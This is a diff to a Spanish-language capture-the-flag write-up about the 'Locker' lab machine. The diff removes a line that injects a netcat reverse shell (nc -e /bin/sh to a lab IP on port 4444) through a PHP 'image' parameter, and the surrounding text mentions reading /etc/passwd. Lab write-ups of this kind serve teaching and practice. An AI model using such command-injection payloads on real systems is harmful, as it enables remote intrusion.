@@ -69,10 +69,6 @@ Después de mucho tiempo me doy cuenta de que tengo un bonito RCE.
 
 Obtengo acceso al sistema.
 
-```console
-view-source:http://10.0.2.20/locker.php?image=;nc%20-e%20/bin/sh%2010.0.2.4%204444;
-```
-
 ![](/assets/images/hmvm-Locker/acceso.png)
 
 Lanzo un cat al fichero ``/etc/passwd``  para ver que usuarios tiene el sistema.
